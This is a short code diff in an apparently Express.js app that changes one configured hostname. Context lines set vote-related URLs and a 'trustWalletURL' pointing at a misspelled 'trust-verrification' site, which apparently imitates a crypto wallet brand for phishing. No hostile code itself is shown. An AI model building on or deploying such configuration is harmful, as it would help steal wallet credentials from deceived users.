@@ -49,7 +49,7 @@ app.use(function (req, res, next) {
   req.app.voteUrl = "www.polzpulse.pro";
   req.app.voteUrl2 = "www.polzpulse.pro";
   req.app.hostname1 = "www.polzpulse.pro";
-  req.app.hostname2 = "traversetrendz.site";
+  req.app.hostname2 = "www.polzpulse.pro";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
